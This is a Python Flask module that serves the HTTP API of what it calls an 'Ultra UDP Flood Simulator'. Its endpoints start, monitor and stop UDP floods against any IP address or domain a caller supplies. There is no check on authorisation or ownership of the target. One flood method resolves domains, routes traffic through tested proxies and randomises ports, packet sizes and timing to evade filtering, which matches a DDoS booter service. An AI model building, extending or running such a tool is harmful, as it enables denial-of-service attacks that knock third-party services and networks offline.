"""
All HTTP endpoints.
Blueprint is registered by api.create_app().
"""

import multiprocessing as mp
import logging
import socket as _socket
from flask import Blueprint, request, jsonify

import config
import state
from methods import list_methods, DEFAULT_METHOD
from proxy_loader import load_proxies, test_proxies

logger = logging.getLogger(__name__)
bp     = Blueprint('flood', __name__)


# ── Root ──────────────────────────────────────────────────────────────────────

@bp.route('/', methods=['GET'])
def index():
    return jsonify({
        'service':  'Ultra UDP Flood Simulator API',
        'version':  '5.0.0',
        'status':   'running',
        'methods':  list_methods(),
        'endpoints': {
            'POST /api/hit':            'Start a flood',
            'GET  /api/status':         'List all active floods',
            'GET  /api/status/<id>':    'Get flood status',
            'POST /api/stop/<id>':      'Stop a flood',
            'POST /api/stop/all':       'Stop all floods',
            'GET  /api/stats':          'Get all stats',
            'GET  /api/stats/<id>':     'Get stats for one flood',
            'GET  /api/config':         'Get server config',
            'GET  /api/methods':        'List available methods',
        },
    })


# ── Methods ───────────────────────────────────────────────────────────────────

@bp.route('/api/methods', methods=['GET'])
def get_methods():
    return jsonify(list_methods())


@bp.route('/api/methods/2/preview', methods=['GET'])
def preview_method_b():
    """Return a sample of the random ports and packet sizes method B will use."""
    import os, random
    import configb
    samples = int(request.args.get('n', 20))
    samples = max(1, min(samples, 200))
    pool = [
        {
            'port':         random.randint(configb.B_MIN_PORT, configb.B_MAX_PORT),
            'packet_bytes': len(os.urandom(random.randint(configb.B_MIN_PACKET_SIZE,
                                                           configb.B_MAX_PACKET_SIZE))),
        }
        for _ in range(samples)
    ]
    ports  = [e['port']         for e in pool]
    sizes  = [e['packet_bytes'] for e in pool]
    return jsonify({
        'samples':        pool,
        'port_range':     {'min': min(ports),  'max': max(ports),  'unique': len(set(ports))},
        'size_range':     {'min': min(sizes),  'max': max(sizes)},
        'config': {
            'B_MIN_PORT':        configb.B_MIN_PORT,
            'B_MAX_PORT':        configb.B_MAX_PORT,
            'B_MIN_PACKET_SIZE': configb.B_MIN_PACKET_SIZE,
            'B_MAX_PACKET_SIZE': configb.B_MAX_PACKET_SIZE,
        },
    })


# ── Flood control ─────────────────────────────────────────────────────────────

@bp.route('/api/hit', methods=['POST'])
def start_flood():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Expected JSON body'}), 400

        method_id = int(data.get('method', DEFAULT_METHOD))

        # ── Method B: only ip/domain + time needed ────────────────────────────
        if method_id == 2:
            raw_target = data.get('ip') or data.get('domain')
            if not raw_target:
                return jsonify({'error': 'Method 2 requires "ip" or "domain"'}), 400

            time_val = data.get('time') or data.get('duration')
            if time_val is None:
                return jsonify({'error': 'Method 2 requires "time" (seconds)'}), 400

            # Resolve domain → IP if needed
            try:
                resolved_ip = _socket.gethostbyname(raw_target)
            except _socket.gaierror:
                return jsonify({'error': f'Cannot resolve "{raw_target}"'}), 400

            duration    = max(1, int(time_val))
            processes   = int(data.get('processes', mp.cpu_count()))

            # Load proxies from file, test each one, use only working ones
            all_proxies  = load_proxies()
            proxy_report = test_proxies(all_proxies)
            working      = proxy_report['proxies']

            instance_id = state.manager.create_flood(
                target_ip=resolved_ip,
                target_port=0,          # ignored — worker randomises per packet
                packet_size=1400,       # ignored — worker randomises per packet
                duration=duration,
                processes=processes,
                interface='auto',
                use_random_ports=True,  # always on for method B
                method_id=2,
                proxies=working,
            )

            return jsonify({
                'success':     True,
                'instance_id': instance_id,
                'message':     f'Method B flood started on {raw_target} ({resolved_ip}) for {duration}s',
                'proxies': {
                    'total_loaded':  proxy_report['total'],
                    'working':       proxy_report['working'],
                    'failed':        proxy_report['failed'],
                },
                'target': {
                    'input':        raw_target,
                    'resolved_ip':  resolved_ip,
                    'time':         duration,
                    'random_ports': True,
                    'random_size':  True,
                    'random_delay': True,
                    'method':       2,
                },
                'status_url': f'/api/status/{instance_id}',
            }), 201

        # ── Method 1 (and future methods): full param set ─────────────────────
        ip   = data.get('ip')
        port = data.get('port')

        if not ip:
            return jsonify({'error': 'Missing "ip"'}), 400
        if port is None:
            return jsonify({'error': 'Missing "port"'}), 400
        if not (0 <= int(port) <= 65535):
            return jsonify({'error': '"port" must be 0–65535'}), 400

        packet_size = int(data.get('packet_size', config.DEFAULT_PACKET_SIZE))
        packet_size = max(config.MIN_PACKET_SIZE, min(packet_size, config.MAX_PACKET_SIZE))

        duration     = max(1, int(data.get('duration', config.DEFAULT_DURATION)))
        processes    = int(data.get('processes', mp.cpu_count()))
        random_ports = bool(data.get('random_ports', False))
        interface    = data.get('interface', 'auto')

        instance_id = state.manager.create_flood(
            target_ip=ip,
            target_port=int(port),
            packet_size=packet_size,
            duration=duration,
            processes=processes,
            interface=interface,
            use_random_ports=random_ports,
            method_id=method_id,
        )

        return jsonify({
            'success':     True,
            'instance_id': instance_id,
            'message':     f'Flood started on {ip}:{port} (method {method_id})',
            'target': {
                'ip': ip, 'port': port,
                'packet_size': packet_size, 'duration': duration,
                'processes': processes, 'random_ports': random_ports,
                'interface': interface, 'method': method_id,
            },
            'status_url': f'/api/status/{instance_id}',
        }), 201

    except ValueError as e:
        return jsonify({'error': str(e)}), 400
    except Exception as e:
        logger.exception('/api/hit error')
        return jsonify({'error': str(e)}), 500


@bp.route('/api/stop/all', methods=['POST'])
def stop_all():
    try:
        count = state.manager.stop_all_floods()
        return jsonify({'success': True, 'stopped': count})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@bp.route('/api/stop/<instance_id>', methods=['POST'])
def stop_flood(instance_id):
    try:
        if not state.manager.stop_flood(instance_id):
            return jsonify({'error': 'Instance not found'}), 404
        return jsonify({'success': True, 'stopped': instance_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ── Status & stats ────────────────────────────────────────────────────────────

@bp.route('/api/status', methods=['GET'])
def get_status():
    try:
        return jsonify(state.manager.get_status())
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@bp.route('/api/status/<instance_id>', methods=['GET'])
def get_instance_status(instance_id):
    try:
        result = state.manager.get_status(instance_id)
        return jsonify(result), (404 if 'error' in result else 200)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@bp.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        return jsonify(state.manager.get_all_stats())
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@bp.route('/api/stats/<instance_id>', methods=['GET'])
def get_instance_stats(instance_id):
    try:
        result = state.manager.get_status(instance_id)
        if 'error' in result:
            return jsonify(result), 404
        return jsonify(result.get('stats', {}))
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ── Config ────────────────────────────────────────────────────────────────────

@bp.route('/api/config', methods=['GET'])
def get_config():
    return jsonify({
        'api_version': '5.0.0',
        'defaults': {
            'packet_size': config.DEFAULT_PACKET_SIZE,
            'duration':    config.DEFAULT_DURATION,
            'min_packet':  config.MIN_PACKET_SIZE,
            'max_packet':  config.MAX_PACKET_SIZE,
            'method':      DEFAULT_METHOD,
        },
        'system': {
            'sendmmsg':   config.USE_SENDMMSG,
            'so_reuseport': True,
            'send_buffer': '8 MB',
            'cpu_cores':  mp.cpu_count(),
        },
        'available_methods': list_methods(),
    })
